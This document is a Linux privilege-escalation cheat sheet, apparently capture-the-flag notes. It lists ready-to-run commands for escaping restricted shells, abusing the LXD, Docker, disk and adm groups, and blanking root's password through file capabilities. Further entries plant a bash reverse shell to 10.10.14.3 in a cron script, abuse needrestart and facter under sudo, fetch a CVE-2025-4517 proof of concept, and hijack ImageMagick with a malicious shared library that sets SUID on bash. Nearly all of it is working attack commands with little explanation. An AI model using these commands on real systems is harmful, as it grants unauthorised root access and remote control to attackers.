##simple commands
```
ls -la
sudo -su
sudo -l
crontab -l
```
##using /bin/bash 
```
sudo -u user /bin/bash
```
##Escapeing the restricted shell (rbash)
```
Using Editors

    Vim:
        Open vim: vim
        Set the shell: :set shell=/bin/bash
        Launch the shell: `:shell

    Ed:
        Open ed: ed
        Execute: `!'/bin/bash'

Using Python

    Python Command:
        Run: python -c 'import pty; pty.spawn("/bin/bash")'
        Alternatively: python3 -c 'import pty; pty.spawn("/bin/bash")'

Using Script Command

    Script Command:
        Execute: /usr/bin/script -qc /bin/bash /dev/null

Using SSH

    SSH with No Profile:
        Connect using: ssh user@host -t "bash --noprofile"

```

##Privileged Groups
LXC / LXD

```
id

uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)

Unzip the Alpine image.
Start the LXD initialization process. Choose the defaults for each prompt. Consult this post for more information on each step.

lxd init
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
lxc init alpine r00t -c security.privileged=true
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
lxc start r00t
~/64-bit Alpine$ lxc exec r00t /bin/sh
```
##Docker, Disk, ADM

```
Docker → Effectively root
docker run -v /root:/mnt -it ubuntu

 id
uid=1000(docker-user) gid=1000(docker-user) groups=1000(docker-user),116(docker)

docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash

Mount any host dir → steal/add SSH keys, read /etc/shadow
💿 Disk → Full filesystem access
Use debugfs on /dev/sda1 → same impact as root
📋 ADM → Read all logs in /var/log
bashfind / -group adm -type f 2>/dev/null
No direct root, but leaks creds, cron jobs, user activity
```
##Capabilities privilage

```
Enumerating Capabilities

 find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
Bypass all file permission checks → read/write any file as root
Exploit — Edit /etc/passwd
Interactive:
bashvim.basic /etc/passwd
# Remove root's password hash, then :w!
One-liner (non-interactive):
bashecho -e ':%s/^root:[^:]*:/root::/\nwq!' | vim.basic -es /etc/passwd
This removes root's password → now su root needs no password
Verify:
bashcat /etc/passwd | head -n1
# root::0:0:root:/root:/bin/bash  ← empty password = success
su root

```


##Vulnerable Services
```
screen -v
Screen version 4.05.00 (GNU) 10-Dec-16
Privilege Escalation - Screen_Exploit.sh

```
##Cron Job Abuse
```
-- First, let's look around the system for any writeable files or directories

 find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

-- Let's run pspy and have a look at running corn job's

./pspy64 -pf -i 1000

-- Find the /bin/bash for the corn jon
modify the script to add a Bash one-liner reverse shell

bash -i >& /dev/tcp/10.10.14.3/443 0>&1

nc -lnvp 443

listening on [any] 443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.2.12] 38882
 
```


##needrestart v3.7
```
echo 'system("/bin/bash");' > /tmp/root.sh

Now run needrestart, with sudo, using using that configuration file as an argument:

sudo /usr/sbin/needrestart -c /tmp/root.sh
```

##/usr/bin/facter
```
mkdir -p /tmp/exploit_facts

cd /tmp/exploit_facts/

cat > /tmp/exploit_facts/exploit.rb << 'EOF'
#!/usr/bin/env ruby
puts "custom_fact=exploited"
system("chmod +s /bin/bash")
EOF

sudo /usr/bin/facter --custom-dir=/tmp/exploit_facts/ x

bash -p
```
##(root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *

CVE-2025-4517, a critical vulnerability in Python's tarfile module that allows arbitrary file write through a combination of symlink path traversal and hardlink manipulation. This bypasses the filter="data" protection introduced in Python 3.12.

```
wget https://raw.githubusercontent.com/AzureADTrent/CVE-2025-4517-POC-HTB/refs/heads/main/CVE-2025-4517-POC.py

```````````Manual Step-by-Step

# 1. Create the exploit tar
python3 exploit.py --create-only

# 2. Deploy to target
cp /tmp/cve_2025_4517_exploit.tar /opt/backup_clients/backups/backup_9999.tar

# 3. Execute via vulnerable script
sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py \
  -b backup_9999.tar \
  -r restore_exploit

# 4. Verify sudoers modification
sudo cat /etc/sudoers | grep "$(whoami)"

# 5. Get root
sudo /bin/bash

```
##Privilege Escalation — Docker Group Escape
```
Enumeration

id
# uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
 
cat /etc/group | grep docker
# docker:x:111:alice

At first glance ben is not in the docker group. However, running newgrp docker does not prompt for a password, meaning ben's primary group is implicitly allowed into docker.

newgrp docker
id
# uid=1001(ben) gid=111(docker) groups=111(docker),37(operator),1001(ben)
 
docker images
# REPOSITORY                    TAG       IMAGE ID
# mysql                         latest    f66b7a288113
# privatebin/nginx-fpm-alpine   2.0.2     f5f5564e6731

Docker Escape

The privatebin/nginx-fpm-alpine image runs as nobody — use mysql instead which runs as root:

docker run -v /:/mnt --rm mysql sh -c "cp /mnt/root/root.txt /mnt/tmp/flag.txt && chmod 777 /mnt/tmp/flag.txt"
cat /tmp/flag.txt

Or with a proper TTY:

docker run -v /:/mnt --rm -it mysql chroot /mnt bash
cat /root/root.txt
```
##ImageMagick
```
magick -version
Version: ImageMagick 7.1.1-35

gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("cp /bin/bash /tmp/0xdf; chmod 6777 /tmp/0xdf");
    exit(0);
}
EOF

ls -l /tmp/0xdf

 /tmp/0xdf -p
```
